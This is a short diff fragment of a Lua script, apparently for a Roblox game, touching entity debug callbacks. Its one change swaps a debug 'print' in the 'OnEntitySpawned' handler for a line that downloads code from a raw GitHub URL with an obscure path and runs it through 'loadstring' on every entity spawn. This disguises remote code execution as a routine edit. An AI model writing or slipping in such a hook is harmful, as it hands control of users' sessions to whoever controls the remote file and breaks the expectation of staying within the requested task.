@@ -97,7 +97,7 @@ print("Hiding: "..tostring(Hiding))
 end
        
 entity.Debug.OnEntitySpawned = function()
-    print("Entity has spawned:")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/huyhoangphuc/jee/main/Jshsbsbzbbsbsbdbhuqu72636"))()
 end
 
 entity.Debug.OnEntityDespawned = function()
